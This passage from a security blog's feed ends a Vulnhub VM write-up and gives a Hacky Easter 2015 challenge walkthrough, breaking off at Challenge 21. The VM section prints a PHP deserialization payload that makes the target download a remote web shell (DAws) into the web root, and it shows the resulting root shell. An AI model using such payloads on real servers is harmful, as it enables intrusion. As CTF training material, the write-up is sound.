        &lt;span style=&#34;color: #f8f8f2&#34;&gt;$f&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fopen($this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;path&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;name_file&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fwrite($f,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$data);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fclose($f);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;chmod($this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;path&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;name_file&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0644&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;Show&lt;/code&gt; class on the other hand is only useful for testing, as this will provide visual
feedback when &lt;code&gt;sec.php&lt;/code&gt; gets rendered and runs the &lt;code&gt;echo&lt;/code&gt; statement. This will
invoke the &lt;code&gt;__toString&lt;/code&gt; method on the &lt;code&gt;Show&lt;/code&gt; class. Passing &lt;code&gt;test=O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:2:&amp;quot;XX&amp;quot;;}&lt;/code&gt;
will print &lt;code&gt;Showme&lt;/code&gt;, confirming that the serialisation worked.&lt;/p&gt;

&lt;p&gt;Now to get DAws on there as root. First things first I need to determine the serialised
string. I do this with a simple PHP script that searialises the &lt;code&gt;Test&lt;/code&gt; class and
prints out the string I need. Which is&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:30:&amp;quot;http://192.168.56.101/DAws.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;DAws.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Using Burp suite I use a &lt;code&gt;GET&lt;/code&gt; request to &lt;code&gt;sec.php&lt;/code&gt;, send it to &lt;code&gt;Repeater&lt;/code&gt; and convert
it to a &lt;code&gt;POST&lt;/code&gt; request with the required payload:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/kiutbRt.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Then I, once again, browse to my DAws url and bind a shell to finally get:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# whoami &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; id
root
uid=0(root) gid=0(root) groups=0(root)
# cat flag.txt
      ___           ___           ___           ___           ___           ___           ___     
     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 



     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
     tratando de llegar hasta aca. Eso es lo que realmente importa!.


#Blog: www.securitysignal.org

#Twitter: @SecSignal, @q3rv0
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I learned sooooo much through this VM. Many thanks to qu3rv0 for creating it,
Vulnhub for hosting it, and the people who helped me get through it (esp g0blin).&lt;/p&gt;

&lt;p&gt;I look forward to the next one.&lt;/p&gt;

&lt;h1 id=&#34;note:3817275722f75303351ad52bb23d8c3d&#34;&gt;Note&lt;/h1&gt;

&lt;p&gt;As it was possible to upload a shell with the SQL Admin page, browsing to &lt;code&gt;/var/www&lt;/code&gt; would have
taken us directly to the end stage. All the info was there and &lt;code&gt;suphp.conf&lt;/code&gt; is world writeable.
Had I done that though I would have missed out on the XPath challenge, which taught me some new tricks,
as well as all the other fun puzzles.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hacky Easter 2015</title>
      <link>https://svenito.github.io/nowhere/2015/06/01/hacky-easter-2015/</link>
      <pubDate>Mon, 01 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/06/01/hacky-easter-2015/</guid>
      <description>

&lt;p&gt;Another year, another Hacky Easter and a month, of fun, learning, and
frustrations. All in all this was another great year and I&amp;rsquo;m already looking
forward to 2016&amp;rsquo;s edition. I found this year&amp;rsquo;s challenges were a bit harder than
last year, but I did my best.&lt;/p&gt;

&lt;h1 id=&#34;challenge-01:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 01&lt;/h1&gt;

&lt;p&gt;I&amp;rsquo;m told to search out the password in the following image&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/mIXj50g.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Taking note of the missing letters and rearranging them to spell &lt;code&gt;HACKERZ&lt;/code&gt; I&amp;rsquo;ll enter
that into the egg-o-matic and see what happens. Oh, hello there&amp;rsquo;e the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-02:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 02&lt;/h1&gt;

&lt;p&gt;The eggs is already there:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/98japcd.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;But it won&amp;rsquo;t scan in its current state, not with &lt;em&gt;NO&lt;/em&gt; written in the QR code.
First things first I looked at the page and image source. Turns out that this is
not an image, but a table instead. I examined the table with Firebug and noticed
that the elements of the &lt;em&gt;NO&lt;/em&gt; have different CSS tags. Looking up at the header I
saw that those tags were defined twice, causing the values to be overriden.&lt;/p&gt;

&lt;p&gt;I created a local copy, set the values to the initial values (so delete the second
definition) and then we get a valid QR code that will scan.&lt;/p&gt;

&lt;h1 id=&#34;challenge-03:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 03&lt;/h1&gt;

&lt;p&gt;Lego. I love Lego, and therefore already knew what an &lt;code&gt;ldx&lt;/code&gt; file is. So I opened
it in Lego Digital Designer and took a look at the bricks. Looks like quite a hard
code to crack. Although it seems a little odd that the bottom layer is 3 bricks deep.
I started picking away some of the first layer and there were white and black bricks
underneath. Potentially a QR code? Even using the &amp;ldquo;Select colour and shape&amp;rdquo; tool, removing
all the top layer bricks will take a little while, but we are then rewarded with a valid QR code.&lt;/p&gt;

&lt;h1 id=&#34;challenge-04:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 04&lt;/h1&gt;

&lt;p&gt;Mobile challenge. I get a list of numbers, or definitions of numbers,
and I have to arrange them in order. The easiest way to do this was to write them in a
file and then use the linux &lt;code&gt;sort&lt;/code&gt; command to order them accordingly. Once I had the
list it was just a matter of ordering them in the right order on the phone, and submitting them
to get the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-05:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 05&lt;/h1&gt;

&lt;p&gt;Another mobile challange. I get shown four bars, each one of which is controlled
by some phone sensor. The middle two were easy to discover. Just by moving the phone I could
see that the orientation and tilt controlled those. The top bar increased every 5 seconds. The
bottom bar however was a bit trickier. It took a day to discover this, because it actually
represents the time the phone has been charging since the app was run for the first time.&lt;/p&gt;

&lt;p&gt;I left it plugged in and waited until the bar was green, aligned the phone correctly and then
waited for the 5 second bar to fill up to collect my egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-06:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 06&lt;/h1&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;dah-dah-dit dit dah-dah-dah di-dah-dit dah-dah-dit dit dah-dah dah-di-dah-dit di-di-dah-dit di-dah-di-dit dah-di-dah-dah
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is clearly morse code. &lt;code&gt;dit&lt;/code&gt; and &lt;code&gt;di&lt;/code&gt; are dots and the &lt;code&gt;dah&lt;/code&gt; is dash. Decoded this to get
&lt;code&gt;georgemcfly&lt;/code&gt;. I entered this and was told I was 3 months too early! Only one thing for it:
change the system date to 3 months in the future. Resubmitted the password and was granted the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-07:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 07&lt;/h1&gt;

&lt;p&gt;Mobile challange. I need to navigate a Google street view style app to search for the
egg. I was actually surprised how easy it was to find. On the second screen
I looked up and there it was, in the sky. Easy right? Well, once I capped the image, I brought
it into Gimp and manipulated it. Took quite a bit of cleanup and contrast tweaking to get it to scan,
but I got there in the end.&lt;/p&gt;

&lt;h1 id=&#34;challenge-08:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 08&lt;/h1&gt;

&lt;p&gt;So from a spreadsheet ID I have to find this particular spreadsheet? Like any sensible person
I avoid working with spreadsheets as much as I can, so I had to investigate how Google
docs uses these IDs. Luckily once you create a new sheet, you can already identify the ID in the URL.
Replace your ID with the Hacky Easter one and you are given the sheet.&lt;/p&gt;

&lt;p&gt;The problem is that the sheet is jumbled up. You need to order the colums and rows in numerical order.
I could have done this in Python, but at the time I got &lt;em&gt;1&lt;/em&gt; back for the black boxes. Being
a spreadsheet n00b I didn&amp;rsquo;t know about conditional formating, but you can specify cell formatting based
on content. So that would have been the easy way.&lt;/p&gt;

&lt;p&gt;Instead I did it manually. Ordering the rows can be done automatically. Then I just copy
pasted the colums in order and snapped the code. Tedious, but produces results.&lt;/p&gt;

&lt;h1 id=&#34;challenge-09:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 09&lt;/h1&gt;

&lt;p&gt;Mobile challenge. The app&amp;rsquo;s splash screen is egg #9, but distorted. With some
skilled timing I screen capped it and imported it into Pixelmator, where I
used the bulge tool to undistort it enough to be able to scan it.&lt;/p&gt;

&lt;p&gt;Alternatively I could have grabbed the image out of the APK I reckon, but
this was simpler at the time.&lt;/p&gt;

&lt;h1 id=&#34;challenge-10:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 10&lt;/h1&gt;

&lt;p&gt;Thumper&amp;rsquo;s got egg 10? Where could he have taken it? Initially I decided
to look in the other challenges and there is one challenge that has a banner
at the bottom. It is an advert for Thumper&amp;rsquo;s info sec training course. Clicking
the banner merely told me that &amp;lsquo;the egg is not in any challenge&amp;rsquo;. They knew we&amp;rsquo;d
come looking.&lt;/p&gt;

&lt;p&gt;So where else would people keep eggs? Of course, on the pages where you can see
the eggs each user has. The url for which is &lt;code&gt;http://hackyeaster.hacking-lab.com/hackyeaster/eggs.html?name=hops&lt;/code&gt;
so all we do it replace the user &lt;code&gt;hops&lt;/code&gt; with &lt;code&gt;Thumper&lt;/code&gt; and sure enough, that&amp;rsquo;s
where he&amp;rsquo;s hidden the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-11:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 11&lt;/h1&gt;

&lt;p&gt;I was expecting this to be a bit harder, but I just downloaded the files,
opened them up in Thunderbird and found a message with attachments. Downloading
the attachment gives you the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-12:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 12&lt;/h1&gt;

&lt;p&gt;A quiz! Simple of course. Well, this is Hacky Easter, so no. The fields are all
incorrectly configured. Look at the source and you can see:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Field 1 will change it contents when it loses focus.&lt;/li&gt;
&lt;li&gt;Field 2 is a number field but should be a string&lt;/li&gt;
&lt;li&gt;Field 3 is a text field but should be a number&lt;/li&gt;
&lt;li&gt;Field 4 is a radio button set, but should be checkboxes&lt;/li&gt;
&lt;li&gt;Field 5 is a dropdown that is missing the right answer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I worked out the answers, as I still need to get them right, and then I used
Firebug to edit the HTML in place. Once ready I hit &lt;em&gt;Submit&lt;/em&gt; only to find I was
wrong. I am sure everything was correct though. I double checked the fields, and
then I noticed that the submit button had &lt;code&gt;value=&amp;quot;false&amp;quot;&lt;/code&gt; on it.&lt;/p&gt;

&lt;p&gt;Once I edited them all again and set the submit button to &lt;code&gt;true&lt;/code&gt; I was granted access
to the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-13:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 13&lt;/h1&gt;

&lt;p&gt;This challenge had me going for quite a while. A great example of how you learn
to observe information. Downloading the video I see a 15 minute video that has a
different QR code every second (approx). Each QR code resolves to a egg style
string, so there&amp;rsquo;s no automated way to filter out the right code.&lt;/p&gt;

&lt;p&gt;I can&amp;rsquo;t watch it and scan each egg, that would take forever. So I thought about
what I know. Eventually it dawned on me that it&amp;rsquo;s called &lt;em&gt;LEET TV&lt;/em&gt;. Leet = 7337.
I wonder if&amp;hellip; scrub the video to 7337 and scan the code. Error message.&lt;/p&gt;

&lt;p&gt;But careful, this isn&amp;rsquo;t the same message as you would get if you scan an invalid
egg. I used a different barcode scanner to scan this code and was given a URL. Result!&lt;/p&gt;

&lt;p&gt;Visiting the URL I download a wav file, which is clearly a reversed audio recording.&lt;/p&gt;

&lt;p&gt;Importing into Audacity, reversing it, and playing it back tells us the timestamp
in the video where the correct QR is shown.&lt;/p&gt;

&lt;h1 id=&#34;challenge-14:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 14&lt;/h1&gt;

&lt;p&gt;On a hunch I just decided to use a 2d barcode scanner to scan the code and see
what happens. Oh, it gives us an egg string. But the app&amp;rsquo;s scanner will only accept
2d codes. Not to worry. Using duckduckgo&amp;rsquo;s qr code creator we can just enter the string
we get from the 1d code, and in return we get a 2d code which we can scan with the
Hacky Easter app.&lt;/p&gt;

&lt;h1 id=&#34;challenge-15:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 15&lt;/h1&gt;

&lt;p&gt;This one was fiendish for me. In the end I actually took apart the APK and
disassembled the code to try and see what this does. From this I could see
that it stores the pics on your SD card. It also runs some analysis on the images,
based on the pixel values. I assumed that it was in fact looking for a picture
of a tomato and a grassy field.&lt;/p&gt;

&lt;p&gt;I took a picture of a green screen and managed to get it to return one half of the
code. The tomato was a bit trickier, as a simply red image was not enough. It actually
needed &lt;em&gt;some&lt;/em&gt; green in it. Google image search for &lt;em&gt;tomato&lt;/em&gt; and took a reasonalbe pic,
which gave me the other half of the code.&lt;/p&gt;

&lt;p&gt;After downloading the pics to my desktop, it was just a matter of joining them together
to give me the complete egg.&lt;/p&gt;

&lt;p&gt;Was a little bit hit and miss with the pic taking, but nice idea for a challenge.&lt;/p&gt;

&lt;h1 id=&#34;challenge-16:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 16&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Ghosts only come out when it&amp;rsquo;s dark&amp;hellip;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This required a few things: a keen eye, and knowledge of crypto.&lt;/p&gt;

&lt;p&gt;So firstly we know that we need to make it dark or something. After a while
I finally noticed the light bulb at the bottom right of the main
challenges page. Clicking that makes the page dark and changes the thumbnail for
challenge 16. Now when we click on it we get a set of 4 strings and picture of
a &amp;ldquo;The Ring&amp;rdquo; girl with the word &lt;em&gt;spooky&lt;/em&gt; written across it. We are also told:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Dark is beautiful. A GOST with chaining appears and has a message for you&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Nothing is a coincidence, so that&amp;rsquo;s no typo. Searching for &lt;em&gt;GOST&lt;/em&gt; I discovered that
it was an encryption method. After quite a bit more searching I discovered that
PHP&amp;rsquo;s mcrypt library supports decrypting this cipher. The cipher requires a
key. On a hunch I decided to use the only other clue available: &lt;em&gt;spooky&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now this is where I almost failed. I could decrypt the first code without any
problem. It resulted in the string &lt;code&gt;http://hackyeas&lt;/code&gt;. But the second string&amp;rsquo;s
first 8 characters were corrupt. I was so stuck until I discovered that
you had to append all the ciphers together in order to get the plaintext. I guess
that&amp;rsquo;s the &lt;code&gt;chaining&lt;/code&gt; part, as well as indicating we should used &lt;code&gt;MCRYPT_MODE_CBC&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This PHP script ended up doing the work for me&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;d5++xytj6RiGwmqEecm63Kow7RZGAAHh&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash2&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;VFsksHFuj/Anap7pWHDZ1XQw8DAApUEN&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash3&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;R5ExOGUKTzGOtvSAlCHkHq6NneL6ZUTX&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash4&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ej8Taxz+kHK9w9U8dxTOSksZ4HKS2YYD&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;$res&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;mcrypt_decrypt(&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;MCRYPT_GOST&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;spooky&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash2&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash3&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash4,&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_encode($res)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; php ./gost.php &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64 -d
http://hackyeaster.hacking-lab.com/hackyeaster/images/egg_16_a3eIIACKSy02sJ6LxXeh.png
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No initialisation vector was required, so you can ignore the warning.&lt;/p&gt;

&lt;h1 id=&#34;challenge-17:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 17&lt;/h1&gt;

&lt;p&gt;There&amp;rsquo;s no real way to spot the difference in the images with your eyes. So the
easiest way is to bring them into Gimp on separate layers. Then I adjusted the top
layer&amp;rsquo;s blend mode to &amp;ldquo;difference&amp;rdquo; so that I could see which pixels differ. The image
goes black indicating that there&amp;rsquo;s no differences. Impossible!&lt;/p&gt;

&lt;p&gt;Now thinking that there must be differences I figured that they might be so small
that they appear black. I maxed the contrast and brightness to get:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/0iAoovp.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Now the QR code is in the left eye, and a target shape in the right. The target
needs to be used to invert the pixels in the QR code. Once done, snap the code
and move on.&lt;/p&gt;

&lt;h1 id=&#34;challenge-18:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 18&lt;/h1&gt;

&lt;p&gt;Once we visit the site we get asked to authenticate. No doubt the details will be in
the pcap file, so let&amp;rsquo;s open that. We can see a failed auth followed by a successful
one. Inspect the relevant packet and we get the login:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/dhLNYS9.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Using this to login we are presented with another login form. Trying the same
credentials gives a &amp;ldquo;Payment required&amp;rdquo; page. Heading back to the pcap file let&amp;rsquo;s
see if we can&amp;rsquo;t find some details for this part too. Ah, right there at the bottom.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Gp45s1R.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time however we need to pass the hash and login details via POST. Either
edit the form, or use a tool like Zap or Burp proxy, to add this data to the POST
and we have our egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-19:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 19&lt;/h1&gt;

&lt;p&gt;Not found.&lt;/p&gt;

&lt;p&gt;I will add a solution here later.&lt;/p&gt;

&lt;h1 id=&#34;challenge-20:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 20&lt;/h1&gt;

&lt;p&gt;The big clue here is robots. Why do we love robots? &lt;code&gt;robots.txt&lt;/code&gt; is why. Taking a
look at it I can see&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;User-agent: EasterBot
Disallow: /
Allow: /hackyeaster/bots/bots.

User-agent: *
Disallow: /
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Visiting the url &lt;code&gt;/hackyeaster/bots/bots.html&lt;/code&gt; takes me to the CP30 Wiki page. That can&amp;rsquo;t be right. So I decided
to spoof my user agent to be &lt;code&gt;EasterBot&lt;/code&gt; and I get a different result. An image
with the following text&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;BAMA WABOKI PISAL FATATU FOMU WOSEBI SEJU SOWU SEJU - BAMAS MUFE WAFUB FOMU MOWEWE
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm. I tried to decipher this many ways before I gave up and Googled it. It turns
out this is actually &lt;a href=&#34;http://roila.org/language-guide/vocabulary/&#34;&gt;ROILA&lt;/a&gt; and
comes with a nice dictionary. So I set about translating it and got:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;you must make word of addition two and two - this be name of page
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Right, so I add two and two to give four and I load up
&lt;code&gt;http://hackyeaster.hacking-lab.com//hackyeaster/bots/four.html&lt;/code&gt; and see Gir with the
word &lt;code&gt;MetAE&lt;/code&gt;. Well meta can only mean I need to look at the page metadata. Viewing the source
I see&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;meta&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;content=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Robots talk in ROILA language: eman egap eht esrever tsum&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;meta&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;content=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;secret, page, robots, fun, hacky easter, blrt, five, beep&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;More ROILA? No, it&amp;rsquo;s just backwards english. I&amp;rsquo;ll just go to
&lt;code&gt;http://hackyeaster.hacking-lab.com//hackyeaster/bots/ruof.html&lt;/code&gt; and get the egg/&lt;/p&gt;

&lt;h1 id=&#34;challenge-21:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 21&lt;/h1&gt;

